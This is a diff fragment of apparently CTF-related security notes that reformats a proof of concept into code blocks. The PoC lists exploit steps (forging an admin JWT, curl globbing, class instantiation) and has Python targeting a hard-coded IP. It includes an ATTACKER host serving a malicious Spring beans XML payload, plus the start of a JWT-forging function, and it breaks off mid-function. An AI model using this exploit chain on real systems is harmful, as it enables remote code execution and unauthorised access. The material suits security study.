@@ -312,15 +312,15 @@ https://www.cnblogs.com/afanti/p/10203282.html
 POC : 
 
 ```
-"""
     1) Set JWT to admin=true.
         - https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/
     2) Curl globbing
         - https://everything.curl.dev/cmdline/globbing.html
     3) Class Instantiation
         - https://samuzora.com/posts/rwctf-2024/
-"""
+```
 
+```
 import httpx
 from urllib.parse import quote
 
@@ -328,8 +328,10 @@ from urllib.parse import quote
 URL = "http://172.206.89.197:8090/"
 #URL = "http://localhost:8090/"
 ATTACKER = "https://ATTACKER/pov.xml"
+```
 
-""" pov.xml 
+```
+ pov.xml 
 <?xml version="1.0" encoding="UTF-8" ?>
 <beans xmlns="http://www.springframework.org/schema/beans"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
@@ -341,10 +343,12 @@ ATTACKER = "https://ATTACKER/pov.xml"
         }
         )}"></bean>
 </beans>
-"""
+```
 
 # Set JWT admin true cookie
 # Ref: https://blog.kuron3k0.vip/2021/04/10/vulns-of-misunderstanding-annotation/
+
+```
 def get_admin_jwt(client):
     payload = {
         "firstName": "marce",
